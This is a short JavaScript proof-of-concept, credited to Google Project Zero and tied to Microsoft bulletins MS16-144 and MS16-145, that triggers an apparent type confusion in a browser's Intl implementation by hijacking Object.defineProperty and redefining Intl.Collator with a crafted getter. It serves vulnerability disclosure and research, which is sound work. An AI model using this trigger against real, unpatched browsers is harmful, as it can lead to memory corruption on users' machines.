// https://bugs.chromium.org/p/project-zero/issues/detail?id=972
// http://technet.microsoft.com/security/bulletin/MS16-144
// http://technet.microsoft.com/security/bulletin/MS16-145
// Report: Dec 2016
// Fix: Oct 2016
// Credit: Natalie Silvanovich, Google Project Zero

var d = Object.defineProperty;

var noobj = {
  get: function () {
    return 0x1234567 >> 1;
  },
  set: function () { }
};

function f(){
  var i = Intl;
  Intl  = {}; // this somehow prevents an exception that prevents laoding
  d(i, "Collator", noobj);
}

Object.defineProperty = f;

var q = new Intl.NumberFormat(["en"]);
